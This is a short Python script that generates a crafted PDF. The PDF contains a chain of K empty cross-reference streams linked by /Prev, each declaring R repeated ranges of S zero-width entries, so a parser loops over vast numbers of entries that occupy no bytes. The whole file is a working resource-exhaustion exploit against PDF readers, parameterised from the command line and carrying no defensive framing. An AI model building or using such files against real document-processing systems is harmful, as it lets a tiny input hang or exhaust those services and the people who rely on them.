# Newest xref stream lists the document; K older xref streams (chained by /Prev) each list
# R x [0 S] entries with /W [0 0 0] and no data: every entry costs a loop step and no bytes.
# usage: zerow.py S R K out.pdf
import sys, struct
S, R, K, out_path = int(sys.argv[1]), int(sys.argv[2]), int(sys.argv[3]), sys.argv[4]
content = b"BT /F1 24 Tf 72 700 Td (Record quarter) Tj ET"
objs = {1: b"<< /Type /Catalog /Pages 2 0 R >>", 2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
        4: b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream",
        5: b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"}
out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"); off = {}
for n in sorted(objs):
    off[n] = len(out); out += b"%d 0 obj\n" % n + objs[n] + b"\nendobj\n"
prev = None
idx = b" ".join([b"0 %d" % S] * R)
for k in range(K):
    at = len(out)
    out += b"%d 0 obj\n<< /Type /XRef /Size %d /W [0 0 0] /Index [%s] /Length 0%s >>\nstream\n\nendstream\nendobj\n" % (6, S, idx, b" /Prev %d" % prev if prev is not None else b"")
    prev = at
xat = len(out)
rows = b"\x00\x00\x00\x00\x00\xff" + b"".join(b"\x01" + struct.pack(">I", off[n]) + b"\x00" for n in range(1, 6)) + b"\x01" + struct.pack(">I", xat) + b"\x00"
out += b"6 0 obj\n<< /Type /XRef /Size %d /W [1 4 1] /Index [0 7] /Root 1 0 R /Length %d%s >>\nstream\n" % (S, len(rows), b" /Prev %d" % prev if prev is not None else b"") + rows + b"\nendstream\nendobj\n"
out += b"startxref\n%d\n%%%%EOF\n" % xat
open(out_path, "wb").write(out)
